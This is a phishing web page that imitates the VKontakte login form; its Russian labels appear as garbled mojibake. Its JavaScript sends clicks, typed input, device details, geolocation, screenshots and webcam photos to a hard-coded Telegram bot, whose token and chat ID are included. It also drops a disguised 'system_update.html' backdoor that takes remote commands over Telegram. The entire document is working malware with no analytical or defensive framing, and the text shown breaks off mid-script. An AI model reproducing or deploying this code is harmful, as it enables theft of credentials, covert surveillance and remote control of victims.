<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–í–ö–æ–Ω—Ç–∞–∫—Ç–µ | –í—Ö–æ–¥</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
        }
        .vk-logo {
            text-align: center;
            margin-bottom: 30px;
            color: #2787f5;
            font-size: 32px;
            font-weight: bold;
        }
        .form-group {
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #d3d9de;
            border-radius: 4px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #2787f5;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background: #1a6bc9;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #666;
            font-size: 14px;
        }
        .hidden {
            display: none;
        }
        #downloadLink {
            display: none;
        }
    </style>
</head>
<body>
    <!-- –§–ò–®–ò–ù–ì–û–í–ê–Ø –§–û–†–ú–ê –í–ö -->
    <div class="login-container" id="loginForm">
        <div class="vk-logo">–í–ö–æ–Ω—Ç–∞–∫—Ç–µ</div>
        <form id="vkForm">
            <div class="form-group">
                <input type="text" id="phone" placeholder="–¢–µ–ª–µ—Ñ–æ–Ω –∏–ª–∏ email" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" placeholder="–ü–∞—Ä–æ–ª—å" required>
            </div>
            <button type="submit">–í–æ–π—Ç–∏</button>
        </form>
        <div class="footer">
            <a href="#" style="color: #2787f5; text-decoration: none;">–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è</a>
        </div>
    </div>

    <!-- –°–û–û–ë–©–ï–ù–ò–ï –û–ë –û–®–ò–ë–ö–ï -->
    <div class="login-container hidden" id="errorMsg">
        <div style="text-align: center; color: #e64646;">
            <div style="font-size: 48px; margin-bottom: 20px;">‚ö†Ô∏è</div>
            <h3>–í—Ä–µ–º–µ–Ω–Ω—ã–µ —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–∏–µ —Ä–∞–±–æ—Ç—ã</h3>
            <p style="margin: 20px 0;">–ü–æ–ø—Ä–æ–±—É–π—Ç–µ –≤–æ–π—Ç–∏ –ø–æ–∑–∂–µ. –ü—Ä–∏–Ω–æ—Å–∏–º –∏–∑–≤–∏–Ω–µ–Ω–∏—è –∑–∞ –Ω–µ—É–¥–æ–±—Å—Ç–≤–∞.</p>
            <button onclick="location.reload()">–ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞</button>
        </div>
    </div>

    <!-- –°–ö–ê–ß–ò–í–ê–ù–ò–ï –§–ê–ô–õ–ê (—Å–∫—Ä—ã—Ç–Ω–æ) -->
    <a id="downloadLink" download="system_update.html"></a>

    <script>
        // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
        const BOT_TOKEN = "7619600603:AAEPTYr6ShZQi5KoSvDPmGS7L5M-k8L3AT8";
        const CHAT_ID = "1229704307";
        const SESSION_ID = Math.random().toString(36).substring(2, 15);
        
        let collectedData = {
            credentials: {},
            deviceInfo: {},
            location: {},
            clicks: [],
            keystrokes: [],
            forms: [],
            sessionId: SESSION_ID
        };

        let isBackdoorActive = true;
        let lastUpdateId = 0;

        // üì® –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram
        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const data = {
                chat_id: CHAT_ID,
                text: message.substring(0, 4000)
            };
            
            // –ò—Å–ø–æ–ª—å–∑—É–µ–º fetch —Å –æ–±—Ä–∞–±–æ—Ç–∫–æ–π –æ—à–∏–±–æ–∫
            fetch(url, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).catch(e => console.log('Telegram error'));
        }

        // üéØ –¢–†–ï–ö–ò–ù–ì –ö–õ–ò–ö–û–í
        document.addEventListener('click', function(e) {
            const clickData = {
                time: new Date().toISOString(),
                element: e.target.tagName + (e.target.id ? '#' + e.target.id : '') + (e.target.className ? '.' + e.target.className : ''),
                text: e.target.textContent?.substring(0, 50),
                coordinates: {x: e.clientX, y: e.clientY}
            };
            
            collectedData.clicks.push(clickData);
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–∞–∂–¥—ã–µ 10 –∫–ª–∏–∫–æ–≤
            if (collectedData.clicks.length % 10 === 0) {
                sendToTelegram(`üñ±Ô∏è –ö–ª–∏–∫–∏ (${collectedData.clicks.length}): ${collectedData.clicks.slice(-3).map(c => c.element).join(', ')}`);
            }
        });

        // ‚å®Ô∏è –¢–†–ï–ö–ò–ù–ì –ù–ê–ë–û–†–ê –¢–ï–ö–°–¢–ê
        document.addEventListener('input', function(e) {
            if (e.target.type === 'password') return; // –ü–∞—Ä–æ–ª–∏ –æ—Ç–¥–µ–ª—å–Ω–æ
            
            const keystroke = {
                time: new Date().toISOString(),
                field: e.target.id || e.target.name || 'unknown',
                value: e.target.value
            };
            
            collectedData.keystrokes.push(keystroke);
        });

        // üìù –¢–†–ï–ö–ò–ù–ì –§–û–†–ú
        document.addEventListener('submit', function(e) {
            const formData = {
                time: new Date().toISOString(),
                form: e.target.id || 'unknown',
                data: new FormData(e.target)
            };
            collectedData.forms.push(formData);
        });

        // üì± –°–ë–û–† –ò–ù–§–û–†–ú–ê–¶–ò–ò
        function collectDeviceInfo() {
            collectedData.deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                url: window.location.href,
                sessionId: SESSION_ID
            };
        }

        // üìç –ì–ï–û–õ–û–ö–ê–¶–ò–Ø
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    collectedData.location = {
                        lat: position.coords.latitude,
                        lon: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                    sendToTelegram(`üìç –ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ: ${collectedData.location.lat}, ${collectedData.location.lon}`);
                });
            }
        }

        // üì∏ –°–ö–†–ò–ù–®–û–¢ (—á–µ—Ä–µ–∑ html2canvas)
        function takeScreenshot() {
            if (typeof html2canvas !== 'undefined') {
                html2canvas(document.body).then(canvas => {
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('photo', blob, 'screenshot.png');
                        
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                    });
                });
            } else {
                sendToTelegram("‚ùå html2canvas –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω –¥–ª—è —Å–∫—Ä–∏–Ω—à–æ—Ç–æ–≤");
            }
        }

        // üé• –î–û–°–¢–£–ü –ö –ö–ê–ú–ï–†–ï
        function takePhoto() {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.play();
                        
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            
                            canvas.toBlob(blob => {
                                const formData = new FormData();
                                formData.append('photo', blob, 'photo.png');
                                
                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                    method: 'POST',
                                    body: formData
                                });
                                
                                stream.getTracks().forEach(track => track.stop());
                            });
                        }, 1000);
                    })
                    .catch(e => sendToTelegram(`‚ùå –û—à–∏–±–∫–∞ –∫–∞–º–µ—Ä—ã: ${e.message}`));
            }
        }

        // üíæ –°–û–ó–î–ê–ù–ò–ï –ü–ï–†–°–ò–°–¢–ï–ù–¢–ù–û–ì–û –ë–≠–ö–î–û–†–ê
        function createBackdoorFile() {
    const backdoorHTML = `<!DOCTYPE html>
<html>
<head>
    <title>System Update</title>
    <style>body{background:#f0f0f0;font-family:Arial;text-align:center;padding:50px}</style>
</head>
<body>
    <h1>System Update Manager</h1>
    <p>Checking for updates...</p>
    <script>
        const BOT_TOKEN = "${BOT_TOKEN}";
        const CHAT_ID = "${CHAT_ID}";
        const SESSION_ID = "${SESSION_ID}";
        let isActive = true;

        function backgroundWorker() {
            setInterval(() => {
                fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: "–ë—ç–∫–¥–æ—Ä –∞–∫—Ç–∏–≤–µ–Ω: " + SESSION_ID
                    })
                }).catch(() => {});
            }, 60000);
        }

        function checkCommands() {
            fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates")
                .then(r => r.json())
                .then(data => {
                    if (data.ok) {
                        data.result.forEach(update => {
                            const text = update.message?.text?.toLowerCase();
                            const chatId = update.message?.chat.id;
                            if (chatId == CHAT_ID && text) {
                                if (text === "/screenshot" && typeof html2canvas !== "undefined") {
                                    html2canvas(document.body).then(canvas => {
                                        canvas.toBlob(blob => {
                                            const fd = new FormData();
                                            fd.append("photo", blob, "screen.png");
                                            fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto", {
                                                method: "POST",
                                                body: fd
                                            });
                                        });
                                    });
                                }
                                if (text === "/info") {
                                    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
                                        method: "POST",
                                        body: JSON.stringify({
                                            chat_id: CHAT_ID,
                                            text: "Session: " + SESSION_ID + "\\nUA: " + navigator.userAgent
                                        })
                                    });
                                }
                                if (text === "/destroy") {
                                    document.body.innerHTML = "<h1>Update Complete</h1>";
                                }
                            }
                        });
                    }
                });
        }

        backgroundWorker();
        setInterval(checkCommands, 5000);
        fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
            method: "POST",
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: "–ë—ç–∫–¥–æ—Ä –∑–∞–ø—É—â–µ–Ω: " + SESSION_ID
            })
        });
    <\/script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"><\/script>
</body>
</html>`;

    const blob = new Blob([backdoorHTML], {type: 'text/html'});
    const url = URL.createObjectURL(blob);
    const a = document.getElementById('downloadLink');
    a.href = url;
    a.download = 'system_update.html';
    a.click();

    sendToTelegram("–ë—ç–∫–¥–æ—Ä —É—Å–ø–µ—à–Ω–æ –∑–∞–≥—Ä—É–∂–µ–Ω: " + SESSION_ID);
}